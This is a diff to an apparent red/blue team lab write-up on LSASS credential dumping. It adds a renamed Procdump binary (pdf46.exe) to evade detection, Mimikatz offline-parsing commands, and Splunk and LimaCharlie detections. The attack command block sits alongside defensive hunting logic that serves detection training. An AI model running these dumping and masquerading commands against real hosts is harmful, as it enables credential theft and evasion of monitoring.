@@ -7,6 +7,7 @@ Extract credential material from the compromised host for reuse in later attack 
 
 **MITRE ATT&CK Mapping**
 - **T1003.001:** LSASS Memory  
+- **T1036:** Masquerading  
 
 Credential access marks the transition from system compromise to identity compromise.
 
@@ -24,14 +25,12 @@ The attacker interacts directly with LSASS memory through an active implant to r
 Credential dumping is executed from a SYSTEM-level session.  
 Privilege validation confirms SeDebugPrivilege is enabled prior to memory access.
 
-
 <p align="center">
   <img src="images/system.png">
 </p>
 <p align="center">
   <em>Figure 4.1: SYSTEM-level session confirmed and SeDebugPrivilege enabled</em>
 </p>
-
 
 **Command**
 ```bash
@@ -69,51 +68,75 @@ Non-system binaries accessing LSASS memory represent high-confidence credential 
 
 ---
 
-## Phase 4b — Offline Credential Dumping (Procdump)
+### Endpoint Detection (Blue Team — LimaCharlie)
+
+**Detection Trigger**  
+Endpoint telemetry detects suspicious LSASS memory access behavior.
+
+<p align="center">
+  <img src="images/edr_live.png">
+</p>
+<p align="center">
+  <em>Figure 4.3: LimaCharlie telemetry showing live LSASS access</em>
+</p>
+
+**Assessment**  
+Behavior aligns with known credential dumping techniques and indicates active post-exploitation activity.
+
+---
+
+## Phase 4b — Offline Credential Dumping (Masqueraded Procdump)
 
 **Scenario**  
-To reduce live detection risk, a signed Microsoft Sysinternals utility is used to dump LSASS memory to disk for offline analysis.
+To reduce live detection risk, a signed Microsoft Sysinternals utility is renamed to **pdf46.exe** and used to dump LSASS memory for offline analysis. Renaming the binary attempts to evade name-based detection.
 
-This technique blends malicious behavior with legitimate administrative tooling.
+This combines credential dumping with masquerading.
 
 ---
 
 ### Attack Simulation (Red Team)
 
-The Sysinternals Procdump tool is retrieved by the attacker and discreetly uploaded to the victim host. The utility is then used to create a memory dump for off-host parsing.
+The Sysinternals tool is downloaded, renamed to appear benign, and uploaded to the victim host before execution.
 
 <p align="center">
   <img src="images/wget.png">
 </p>
-<p align="center">
 
-  <p align="center">
+<p align="center">
   <img src="images/systemproof.png">
 </p>
 <p align="center">
-  <em>Figure 4.3: Procdump retrieved and staged from the attacker environment and uploaded to the victim host afterward(pdf46.exe) to conceal the activity</em>
+  <em>Figure 4.4: Tool retrieved, renamed, and staged on the victim host</em>
 </p>
 
+**Command**
+```bash
+C:\Windows\Temp\pdf46.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp /accepteula
+download C:\Windows\Temp\lsass.dmp /home/kali/lsass.dmp
+wine mimikatz.exe
+sekurlsa::minidump /home/kali/lsass.dmp
+sekurlsa::logonpasswords
+```
 
 <p align="center">
   <img src="images/procdump.png">
 </p>
 <p align="center">
-  <em>Figure 4.4: Procdump executing against LSASS</em>
+  <em>Figure 4.5: Masqueraded binary dumping LSASS memory</em>
 </p>
 
 <p align="center">
   <img src="images/download.png">
 </p>
 <p align="center">
-  <em>Figure 4.5: Memory dump exfiltrated to attacker system</em>
+  <em>Figure 4.6: Memory dump exfiltrated to attacker system</em>
 </p>
 
 <p align="center">
   <img src="images/wine.png">
 </p>
 <p align="center">
-  <em>Figure 4.6: Offline credential parsing using Mimikatz</em>
+  <em>Figure 4.7: Offline credential parsing using Mimikatz</em>
 </p>
 
 Credential parsing occurs off-host to minimize endpoint visibility.
@@ -123,20 +146,41 @@ Credential parsing occurs off-host to minimize endpoint visibility.
 ### Detection & Hunting (Blue Team — Splunk)
 
 **Detection Logic**  
-Execution of Procdump targeting LSASS memory is a high-fidelity credential theft signal.
+Detection focuses on behavior rather than binary name: any process attempting to dump LSASS memory.
 
 **Query**
 ```spl
 index=windows EventCode=1 
-Image="*\\procdump*.exe" 
 CommandLine="*-ma lsass.exe*"
-| table _time, User, CommandLine, ParentImage
+| table _time, User, Image, CommandLine, ParentImage
 ```
 
-**[Screenshot required]**
+<p align="center">
+  <img src="images/pdf46.png">
+</p>
+<p align="center">
+  <em>Figure 4.8: Behavioral detection of LSASS dumping despite masquerading</em>
+</p>
 
 **Assessment**  
-Use of legitimate administrative tooling against LSASS is strongly associated with credential exfiltration.
+Renaming the tool bypasses simple signature matching but does not evade behavior-based hunting.
+
+---
+
+### Endpoint Detection (Blue Team — LimaCharlie)
+
+**Detection Trigger**  
+Endpoint telemetry identifies a non-system process targeting LSASS memory regardless of filename.
+
+<p align="center">
+  <img src="images/edr.png">
+</p>
+<p align="center">
+  <em>Figure 4.9: LimaCharlie detection of LSASS dumping despite renamed binary</em>
+</p>
+
+**Assessment**  
+Masquerading failed to evade behavioral monitoring. Activity confirms credential theft with defense evasion intent.
 
 ---
 
@@ -157,6 +201,6 @@ Use of legitimate administrative tooling against LSASS is strongly associated wi
 Credential access was achieved through both live and offline memory extraction:
 
 - Direct LSASS credential dumping  
-- Stealth offline parsing workflow  
+- Masqueraded offline parsing workflow  
 
-The attacker now possesses reusable authentication material. Detection relies on monitoring LSASS access patterns and abuse of administrative tools rather than traditional malware signatures.
+The attacker now possesses reusable authentication material. Effective detection depends on monitoring behavior rather than filenames or tool signatures.
